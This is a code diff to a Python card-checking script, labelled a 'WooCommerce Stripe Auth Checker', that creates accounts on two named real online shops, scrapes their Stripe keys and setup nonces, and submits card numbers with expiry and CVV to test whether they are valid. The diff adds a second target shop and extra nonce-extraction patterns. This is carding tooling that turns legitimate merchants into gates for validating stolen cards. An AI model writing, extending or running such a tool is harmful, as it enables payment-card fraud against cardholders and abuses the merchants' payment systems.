@@ -4,7 +4,7 @@ WooCommerce Stripe Auth Checker
 Professional Stripe authentication checker using WooCommerce sites.
 Auto-generates credentials and processes card checks.
 
-Site: https://epicalarc.com
+Supports: epicalarc.com, shavercity.com.au
 """
 
 import asyncio
@@ -17,8 +17,7 @@ from typing import Dict, Optional, Tuple
 from bs4 import BeautifulSoup
 import time
 
-
-# WooCommerce site configuration
+# Default site (legacy)
 WC_SITE = "https://epicalarc.com"
 
 # Request timeout
@@ -143,20 +142,24 @@ class WCStripeChecker:
                     html3 = await resp.text()
                 
                 pk_match = re.search(r'pk_(live|test)_[0-9a-zA-Z]+', html3)
-                nonce_match = re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html3)
-                
                 if not pk_match:
                     result["response"] = "SITE_ERROR"
                     result["message"] = "Could not extract Stripe public key"
                     return result
-                
+                self.stripe_pk = pk_match.group(0)
+
+                # Multiple nonce patterns for epicalarc, shavercity, and other WC+Stripe sites
+                nonce_match = (
+                    re.search(r'createAndConfirmSetupIntentNonce":"([^"]+)"', html3)
+                    or re.search(r'"createAndConfirmSetupIntentNonce"\s*:\s*"([^"]+)"', html3)
+                    or re.search(r'add_card_nonce["\']?\s*:\s*["\']([^"\']+)["\']', html3)
+                    or re.search(r'wc_stripe_create_and_confirm_setup_intent[^"]*"[^"]*"[^"]*"([a-f0-9]+)"', html3)
+                )
                 if not nonce_match:
                     result["response"] = "SITE_ERROR"
                     result["message"] = "Could not extract setup nonce"
                     return result
-                
-                self.stripe_pk = pk_match.group(0)
-                self.nonce = nonce_match.group(1)
+                self.nonce = nonce_match.group(1).strip()
                 
                 # Step 3: Create payment method
                 # Ensure year is 2 digits
@@ -306,32 +309,35 @@ class WCStripeChecker:
             return result
 
 
-async def check_stripe_wc(card: str, month: str, year: str, cvv: str) -> Dict:
+async def check_stripe_wc(card: str, month: str, year: str, cvv: str, site_url: Optional[str] = None) -> Dict:
     """
     Async function to check a card using WooCommerce Stripe.
-    
+
     Args:
         card: Card number
         month: Expiry month (1-12)
         year: Expiry year (2 or 4 digits)
         cvv: CVV code
-        
+        site_url: Optional base URL (default: WC_SITE). Use for epicalarc or shavercity.
+
     Returns:
         Result dictionary
     """
-    checker = WCStripeChecker(WC_SITE)
+    base = (site_url or WC_SITE).rstrip("/")
+    checker = WCStripeChecker(base)
     return await checker.check_card(card, month, year, cvv)
 
 
-async def check_stripe_wc_fullcc(fullcc: str) -> Dict:
+async def check_stripe_wc_fullcc(fullcc: str, site_url: Optional[str] = None) -> Dict:
     """
     Check a card in fullcc format (cc|mm|yy|cvv).
-    
+
     Args:
         fullcc: Card in format cc|mm|yy|cvv or cc|mm|yyyy|cvv
-        
+        site_url: Optional gate URL (epicalarc.com or shavercity.com.au). Default: WC_SITE.
+
     Returns:
-        Result dictionary with success, response, message, card, etc.
+        Result dictionary with success, response, message, card, site, etc.
     """
     parts = fullcc.replace(" ", "").split("|")
     if len(parts) != 4:
@@ -340,20 +346,14 @@ async def check_stripe_wc_fullcc(fullcc: str) -> Dict:
             "response": "INVALID_FORMAT",
             "message": "Card must be in format: cc|mm|yy|cvv",
             "card": fullcc,
-            "site": WC_SITE
+            "site": site_url or WC_SITE,
         }
-    
     card, month, year, cvv = parts
-    
-    # Normalize month
     if len(month) == 1:
         month = "0" + month
-    
-    # Normalize year
     if len(year) == 2:
         year = "20" + year
-    
-    return await check_stripe_wc(card, month, year, cvv)
+    return await check_stripe_wc(card, month, year, cvv, site_url)
 
 
 def determine_status(result: Dict) -> str:
